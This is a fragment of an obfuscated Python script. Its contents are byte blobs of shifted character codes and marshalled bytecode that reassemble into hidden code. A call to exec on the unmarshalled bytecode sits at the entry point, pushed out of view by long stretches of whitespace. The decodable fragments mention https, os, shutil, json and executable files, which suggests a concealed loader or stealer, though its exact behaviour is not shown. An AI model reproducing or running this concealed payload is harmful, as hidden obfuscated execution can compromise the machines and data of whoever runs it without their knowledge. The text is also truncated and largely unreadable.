0\x00107\x00120\x0040\x0038\x00116\x00117\x00122\x0038s\x17\x00\x00\x0047\x0038\x0038\x00')
__3691__ = Func.calculate(2)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__3691__', b'38\x0038\x0016\x0016\x0016s\x1f\x00\x00\x00114\x00114\x00127\x00122\x00110\x00107\x00109\x00117s\x1d\x00\x00\x0038\x00118\x00127\x00122\x00110\x00117\x00116\x0050s\x1e\x00\x00\x0046\x00105\x00117\x00116\x00122\x00107\x00116\x00122s\x1e\x00\x00\x00118\x00107\x00105\x00122\x00107\x00120\x0098\x00116s\x1e\x00\x00\x00108\x00111\x00114\x00107\x0046\x00107\x00126\x00107s\x1c\x00\x00\x0045\x0047\x0016\x00107\x00126\x00105\x00107\x00118s\x1a\x00\x00\x0054\x0058\x0047\x0016\x00106\x00107\x00108\x0038s\x1e\x00\x00\x00115\x0016\x00111\x00115\x00118\x00117\x00120\x00122s\x1e\x00\x00\x00106\x00107\x00108\x0038\x00110\x00117\x00122\x00105s\x19\x00\x00\x0084\x0047\x0064\x0016\x0038\x0038\x00117\x00121s\x1a\x00\x00\x0038\x00103\x00116\x00106\x0038\x0078\x0090\x0083s\x1f\x00\x00\x00104\x00108\x00123\x00121\x00105\x00103\x00122\x00107s\x1d\x00\x00\x0053\x0053\x00106\x00111\x00121\x00105\x00117\x00120s\x1c\x00\x00\x00108\x00111\x00114\x00107\x0040\x0047\x0016\x00106s\x1f\x00\x00\x00103\x00105\x00101\x00103\x00106\x00106\x00120\x00107s\x1e\x00\x00\x00122\x00115\x00114\x0046\x00108\x00111\x00114\x00107s\x1e\x00\x00\x00121\x00123\x00122\x00111\x00114\x0016\x00111\x00115s\x1e\x00\x00\x00120\x00117\x00115\x0038\x00108\x00114\x00103\x00121s\x1d\x00\x00\x0038\x00118\x00120\x00111\x00116\x00122\x0046\x00120s\x1e\x00\x00\x00125\x00111\x00122\x00110\x0038\x00117\x00118\x00107s\x1e\x00\x00\x0052\x00121\x00122\x00103\x00120\x00122\x00108\x00111s\x1e\x00\x00\x00121\x00121\x00103\x00109\x00107\x0046\x00125\x00107s\x1b\x00\x00\x0038\x00107\x00126\x00111\x00122\x0046\x0055\x0047s\x1b\x00\x00\x0038\x0038\x0038\x0038\x00101\x00101\x00109\x00111s\x1d\x00\x00\x00117\x00120\x00122\x0038\x0073\x00103\x00121\x00107s\x1e\x00\x00\x00110\x00122\x00115\x00114\x0052\x00118\x00103\x00120s\x1e\x00\x00\x00112\x00121\x00117\x00116\x0016\x00111\x00115\x00118s\x1c\x00\x00\x00118\x0046\x00108\x00111\x00114\x00107\x0084\x0047s\x1d\x00\x00\x00109\x00107\x00122\x0046\x0040\x00110\x00122\x00122s\x1e\x00\x00\x00118\x00120\x00111\x00116\x00122\x0046\x00118\x00123s\x1d\x00\x00\x0040\x00111\x00116\x00108\x00117\x0052\x00107\x00126s\x1d\x00\x00\x00120\x00107\x0038\x0086\x00127\x00122\x00110\x00117s\x1d\x00\x00\x0038\x00103\x00120\x00107\x0038\x00105\x00123\x00120s\x1b\x00\x00\x0038\x0038\x0038\x0038\x00101\x00101\x00105\x00117s\x1a\x00\x00\x00107\x00114\x00118\x0046\x0047\x0064\x0016\x0038s\x1c\x00\x00\x0047\x0016\x00106\x00107\x00108\x0038\x00125\x00107s\x1c\x00\x00\x0038\x00110\x00122\x00122\x00118\x00121\x0064\x0053s\x1d\x00\x00\x00110\x00107\x00109\x00117\x00103\x00122\x0057\x0059s\x1a\x00\x00\x0064\x0016\x0038\x0038\x00117\x00121\x0052\x00121s\x1d\x00\x00\x00106\x0052\x00109\x00109\x0053\x00118\x00114\x00103s\x1b\x00\x00\x00107\x0040\x0047\x0016\x00106\x00107\x00108\x0038s\x18\x00\x00\x0041\x0038\x0077\x0077\x0039\x0038\x0095\x00117s\x17\x00\x00\x0038\x0038\x0038\x0038\x0047\x0064\x0016\x0038s\x1b\x00\x00\x0038\x0038\x00107\x00126\x00111\x00122\x0046\x0058s\x1e\x00\x00\x00121\x00115\x00127\x00111\x00118\x0052\x00105\x00117s\x1c\x00\x00\x00115\x0053\x00122\x00107\x00126\x00122\x0040\x0047s\x1b\x00\x00\x0040\x0047\x0016\x00106\x00107\x00108\x0038\x00115s\x19\x00\x00\x00125\x00116\x0046\x0047\x0064\x0016\x0038\x0038s\x1a\x00\x00\x0082\x0053\x0080\x0089\x0038\x00127\x00117\x00123s\x1c\x00\x00\x0038\x0038\x00117\x00121\x0052\x00121\x00127\x00121s\x1e\x00\x00\x00118\x00117\x00120\x00122\x0038\x00121\x00110\x00123s\x1d\x00\x00\x00107\x00121\x00121\x0050\x0038\x00121\x00127\x00121s\x1e\x00\x00\x00122\x00111\x00114\x0016\x00111\x00115\x00118\x00117s\x1d\x00\x00\x00116\x00122\x0046\x0045\x00121\x00113\x00111\x00106s\x1b\x00\x00\x00115\x00107\x0038\x0067\x0038\x0045\x00106\x00117s\x1d\x00\x00\x00114\x00107\x00126\x0050\x0038\x00127\x00103\x00105c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s\x1e\x00\x00\x00d\x01\xa0\x00d\x02d\x03\x84\x00|\x00\xa0\x01\xa1\x00\xa0\x02d\x04\xa1\x01D\x00\x83\x01\xa1\x01S\x00)\x05N\xda\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00s\x00\x00\x00s"\x00\x00\x00|\x00]\x1a}\x01t\x00t\x01|\x01\x83\x01t\x01d\x00\x83')
__1838__ = Func.calculate(4)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__1838__', b'\x01\x18\x00\x83\x01V\x00\x01\x00q\x02d\x01S\x00)\x02r\x02\x00\x00\x00N)\x02\xda\x03chr\xda\x03int)\x02\xda\x02.0\xda\x08__3480__\xa9\x00r\t\x00\x00\x00\xda\x07Specter\xda\t<genexpr>\x03\x00\x00\x00s\x04\x00\x00\x00\x04\x00\x02\x00\xfa\x1b<lambda>.<locals>.<genexpr>\xfa\x01\x00)\x03\xda\x04join\xda\x06decode\xda\x05split\xa9\x01\xda\x08__6469__r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08<lambda>\x03\x00\x00\x00r\x03\x00\x00\x00r\x13\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s(\x00\x00\x00t\x00\x83\x00t\x01t\x02d\x01\x8d\x01\x19\x00d\x02\xa0\x03d\x03d\x04\x84\x00|\x00D\x00\x83\x01\xa1\x01t\x00\x83\x00\x83\x02S\x00)\x05Nr\x11\x00\x00\x00r\x04\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00s\x18\x00\x00\x00|\x00]\x10}\x01t\x00|\x01d\x00\x8d\x01V\x00\x01\x00q\x02d\x01S\x00)\x02r\x11\x00\x00\x00N)\x01\xda\x08__5117__)\x02r\x07\x00\x00\x00r\x12\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00r\x0b\x00\x00\x00\x04\x00\x00\x00s\x04\x00\x00\x00\x04\x00\x02\x00r\x0c\x00\x00\x00)\x04\xda\x08__2386__r\x14\x00\x00\x00\xda\x08__9690__r\x0e\x00\x00\x00)\x01r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00r\x13\x00\x00\x00\x04\x00\x00\x00r\x03\x00\x00\x00N(2\x01\x00\x00\xda\x08builtins\xda\x07globalsZ\x08__7118__Z\x08__5375__Z\x08__6529__Z\x08__6347__r\x16\x00\x00\x00Z\x08__6065__Z\x08__7336__Z\x08__6970__Z\x08__2527__Z\x08__8111__Z\x08__7744__Z\x08__9048__Z\x08__5623__Z\x08__2793__Z\x08__2324__Z\x08__2023__Z\x08__2822__Z\x08__7417__Z\x08__3640__Z\x08__1914__Z\x08__5052__Z\x08__5608__Z\x08__3960__Z\x08__6834__Z\x08__5472__Z\x08__8437__Z\x08__8151__Z\x08__8797__Z\x08__2198__Z\x08__7879__Z\x08__4850__Z\x08__8102__Z\x08__7924__Z\x08__7139__Z\x08__2932__Z\x08__8529__Z\x08__9114__Z\x08__1403__Z\x08__4448__Z\x08__9155__Z\x08__1283__Z\x08__3160__Z\x08__3593__Z\x08__1030__Z\x08__3594__Z\x08__7464__Z\x08__7315__Z\x08__9860__Z\x08__8213__Z\x08__2677__Z\x08__4684__Z\x08__1683__Z\x08__2545__Z\x08__9558__Z\x08__3542__Z\x08__2596__Z\x08__2058__Z\x08__8003__Z\x08__7651__Z\x08__8255__Z\x08__3861__Z\x08__4596__Z\x08__4973__Z\x08__9030__Z\x08__7993__Z\x08__9838__Z\x08__3917__Z\x08__3098__Z\x08__9599__Z\x08__3920__Z\x08__4485__Z\x08__5715__Z\x08__6841__Z\x08__3067__Z\x08__3349__Z\x08__7463__Z\x08__1774__Z\x08__6604__Z\x08__1037__r\x15\x00\x00\x00Z\x08__5791__Z\x08__5388__Z\x08__8544__Z\x08__6192__Z\x08__2656__Z\x08__5902__Z\x08__5845__Z\x08__2821__Z\x08__2500__Z\x08__3128__Z\x08__7375__Z\x08__8059__Z\x08__3660__Z\x08__9167__Z\x08__8755__Z\x08__1234__Z\x08__6121__Z\x08__5906__Z\x08__5219__Z\x08__7759__Z\x08__3709__Z\x08__4858__Z\x08__1527__Z\x08__4513__Z\x08__6157__Z\x08__4688__Z\x08__5593__Z\x08__1891__Z\x08__8985__Z\x08__7843__Z\x08__3627__Z\x08__7350__Z\x08__3273__Z\x08__4831__Z\x08__6465__Z\x08__4946__Z\x08__5986__Z\x08__8402__Z\x08__5382__Z\x08__8832__Z\x08__2854__Z\x08__4518__Z\x08__4888__Z\x08__4842__Z\x08__1386__Z\x08__6784__Z\x08__6616__Z\x08__9808__Z\x08__8871__Z\x08__8268__Z\x08__3928__Z\x08__1186__Z\x08__2575__Z\x08__6981__Z\x08__4562__Z\x08__6568__Z\x08__3524__Z\x08__9912__Z\x08__4456__Z\x08__7524__Z\x08__9762__Z\x08__9624__Z\x08__8383__Z\x08__6987__Z\x08__9453__Z\x08__1510__Z\x08__1843__Z\x08__2624__Z\x08__8724__Z\x08__4778__Z\x08__5886__Z\x08_')
__4402__ = Func.calculate(5)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,Func.define('__4402__', b'_1973__Z\x08__5031__Z\x08__1815__Z\x08__5026__Z\x08__1489__Z\x08__2485__Z\x08__8342__Z\x08__9056__Z\x08__7018__Z\x08__3935__Z\x08__2907__Z\x08__4254__Z\x08__1864__Z\x08__9316__Z\x08__2352__Z\x08__5542__Z\x08__1385__Z\x08__9428__Z\x08__6931__Z\x08__4064__Z\x08__7380__Z\x08__6430__Z\x08__6862__Z\x08__9968__Z\x08__6706__Z\x08__9662__Z\x08__2046__Z\x08__4651__Z\x08__4026__Z\x08__2777__Z\x08__2905__Z\x08__6375__Z\x08__4410__Z\x08__4506__Z\x08__1844__Z\x08__7217__Z\x08__3153__Z\x08__5822__Z\x08__4275__Z\x08__3635__Z\x08__5096__Z\x08__7237__Z\x08__3131__Z\x08__7640__Z\x08__9224__Z\x08__8712__Z\x08__1991__Z\x08__4429__Z\x08__9447__Z\x08__9766__Z\x08__2079__Z\x08__9532__Z\x08__7021__Z\x08__2203__Z\x08__7786__Z\x08__8919__Z\x08__8512__Z\x08__9233__Z\x08__7936__Z\x08__9639__Z\x08__7050__Z\x08__8176__Z\x08__9564__Z\x08__9807__Z\x08__9778__Z\x08__5194__Z\x08__1130__Z\x08__1010__Z\x08__6322__Z\x08__2400__Z\x08__5172__Z\x08__7382__Z\x08__6575__Z\x08__9907__Z\x08__3412__Z\x08__9451__Z\x08__2098__Z\x08__7427__Z\x08__3914__Z\x08__4591__Z\x08__2831__Z\x08__2990__Z\x08__9148__Z\x08__1448__Z\x08__1498__Z\x08__9214__Z\x08__4069__Z\x08__3735__Z\x08__3043__Z\x08__7039__Z\x08__8494__Z\x08__6587__Z\x08__6173__Z\x08__5437__Z\x08__9153__Z\x08__9557__Z\x08__1228__Z\x08__6442__Z\x08__6454__Z\x08__3796__Z\x08__4260__Z\x08__6076__Z\x08__7620__Z\x08__8974__Z\x08__3520__Z\x08__4998__Z\x08__5181__Z\x08__5030__Z\x08__6586__Z\x08__3035__Z\x08__2849__Z\x08__3257__Z\x08__6471__Z\x08__7550__Z\x08__8380__Z\x08__1967__Z\x08__2087__Z\x08__2176__Z\x08__5391__Z\x08__6835__Z\x08__5400__Z\x08__4193__Z\x08__6974__Z\x08__4574__Z\x08__3373__Z\x08__8691__Z\x08__5871__Z\x08__7851__Z\x08__3727__Z\x08__9736__Z\x08__4767__Z\x08__3906__Z\x08__5455__Z\x08__6049__Z\x08__7864__Z\x08__3431__Z\x08__8345__Z\x08__3297__Z\x08__2081__Z\x08__2977__Z\x08__4533__Z\x08__7384__Z\x08__6213__Z\x08__3075__Z\x08__8044__Z\x08__4788__Z\x08__7128__Z\x08__7325__Z\x08__8206__Z\x08__8244__Z\x08__5059__Z\x08__1329__r\x14\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\x10\x00\x00\x00\x08\x01\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00y\x01\x0e\x01')


if __name__ == '__main__':
    Specter(__code__)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ,exec(__import__('marshal').loads(__9414__[1]+__2350__[1]+__4664__[1]+__8765__[1]+__5235__[1]+__3691__[1]+__1838__[1]+__4402__[1]),globals())
